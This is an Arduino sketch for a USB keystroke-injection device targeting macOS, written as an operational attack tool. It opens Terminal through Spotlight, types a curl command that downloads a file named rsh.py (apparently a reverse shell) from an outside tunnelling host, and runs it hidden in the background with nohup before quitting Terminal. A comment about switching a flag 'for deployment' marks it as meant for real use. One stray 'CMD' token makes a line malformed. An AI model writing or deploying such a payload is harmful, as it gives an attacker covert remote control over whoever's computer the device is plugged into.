#include "Keyboard.h"

// change this to false for deployment. it's set to true so that
// the keyboard doesn't continually get hijacked while
// developing the code for this
bool injected = false;

void setup() {
  if (injected == false) {
    Keyboard.begin();
  }
}

void loop() {

  while (injected == true) {
    delay(500);
  }

    delay(500);
      // OS logo, Command (⌘) on Mac
      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press(' ');

      Keyboard.releaseAll();
  
  delay(1500);
      Keyboard.print("terminal.app");
      delay(500);

      // enter:
      Keyboard.write(KEY_RETURN);

      delay(3000);


      // Start typing the block without newlines after each line
      Keyboard.print("curl -so rsh.py https://2.tcp.us-cal-1.ngrok.io.lol/rsh.py");
      Keyboard.write(KEY_RETURN);
      delay(3500);

      Keyboard.print("nohup /usr/bin/python3 rsh.py > /dev/null 2>&1 &");
      Keyboard.write(KEY_RETURN);
      delay(1500);

      
      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press('q');
      Keyboard.releaseAll();
      delay(500);CMD
      
      Keyboard.write(KEY_RETURN);
  

     
      Keyboard.end();
      injected = true;

}